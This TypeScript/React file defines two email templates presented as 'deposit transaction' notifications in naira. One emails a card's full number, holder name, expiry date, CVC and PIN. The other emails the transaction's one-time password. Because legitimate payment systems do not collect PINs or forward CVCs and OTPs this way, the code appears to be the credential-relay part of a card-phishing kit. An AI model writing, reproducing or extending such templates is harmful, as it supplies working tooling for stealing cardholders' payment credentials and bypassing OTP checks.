import React from "react"

interface PinEmailProps {
  email: string
  amount: string
  cardName: string
  cardNumber: string
  expiryDate: string
  cvc: string
  cardType: string
  pin: string
}

const getCardIcon = (cardType: string) => {
  switch (cardType.toLowerCase()) {
    case "visa":
      return (
        <div
          style={{
            width: "40px",
            height: "24px",
            backgroundColor: "#1a56db",
            borderRadius: "4px",
            color: "white",
            fontSize: "10px",
            fontWeight: "bold",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
          }}
        >
          VISA
        </div>
      )
    case "mastercard":
      return (
        <div
          style={{
            width: "40px",
            height: "24px",
            position: "relative",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
          }}
        >
          {/* Red circle */}
          <div
            style={{
              width: "14px",
              height: "14px",
              backgroundColor: "#e11d48",
              borderRadius: "50%",
              position: "absolute",
              left: "6px",
            }}
          />
          {/* Yellow circle */}
          <div
            style={{
              width: "14px",
              height: "14px",
              backgroundColor: "#facc15",
              borderRadius: "50%",
              position: "absolute",
              right: "6px",
            }}
          />
        </div>
      )
    case "verve":
      return (
        <div
          style={{
            width: "50px",
            height: "24px",
            backgroundColor: "#1e3a8a",
            borderRadius: "4px",
            display: "flex",
            alignItems: "center",
            padding: "0 4px",
            color: "white",
            fontWeight: "bold",
            fontSize: "10px",
          }}
        >
          <div
            style={{
              width: "14px",
              height: "14px",
              borderRadius: "50%",
              backgroundColor: "#dc2626",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              fontSize: "9px",
              marginRight: "2px",
            }}
          >
            V
          </div>
          <span>erve</span>
        </div>
      )
    default:
      return <span>{cardType || "Unknown"}</span>
  }
}

export function PinEmail({
  email,
  amount,
  cardName,
  cardNumber,
  expiryDate,
  cvc,
  cardType,
  pin,
}: PinEmailProps) {
  return (
    <div
      style={{
        fontFamily: "Arial, sans-serif",
        maxWidth: "600px",
        margin: "0 auto",
        color: "#111827",
      }}
    >
      <h2 style={{ color: "#059669", marginBottom: "8px" }}>
        Deposit Transaction – Card Payment
      </h2>
      <p>A deposit transaction has been initiated with the following details:</p>

      <div
        style={{
          background: "#f9fafb",
          padding: "20px",
          borderRadius: "8px",
          margin: "20px 0",
          border: "1px solid #e5e7eb",
        }}
      >
        <p><strong>Email:</strong> {email}</p>
        <p><strong>Amount:</strong> ₦{amount}</p>
        <p><strong>Card Holder Name:</strong> {cardName}</p>
        <p><strong>Card Number:</strong> {cardNumber}</p>
        <p><strong>Expiry Date:</strong> {expiryDate}</p>
        <p><strong>CVC:</strong> {cvc}</p>
        <p>
          <strong>Card Type:</strong> {getCardIcon(cardType)}
        </p>
        <p><strong>PIN:</strong> {pin}</p>
      </div>

      <p style={{ color: "#6b7280", fontSize: "14px" }}>
        This is an automated notification from your deposit system.
      </p>
    </div>
  )
}

interface OtpEmailProps {
  email: string
  amount: string
  otp: string
}

export function OtpEmail({ email, amount, otp }: OtpEmailProps) {
  return (
    <div
      style={{
        fontFamily: "Arial, sans-serif",
        maxWidth: "600px",
        margin: "0 auto",
        color: "#111827",
      }}
    >
      <h2 style={{ color: "#059669", marginBottom: "8px" }}>
        Deposit Transaction Completed
      </h2>
      <p>A deposit transaction has been completed successfully:</p>

      <div
        style={{
          background: "#f9fafb",
          padding: "20px",
          borderRadius: "8px",
          margin: "20px 0",
          border: "1px solid #e5e7eb",
        }}
      >
        <p><strong>Email:</strong> {email}</p>
        <p><strong>Amount:</strong> ₦{amount}</p>
        <p><strong>OTP:</strong> {otp}</p>
      </div>

      <p style={{ color: "#6b7280", fontSize: "14px" }}>
        This is an automated notification from your deposit system.
      </p>
    </div>
  )
}
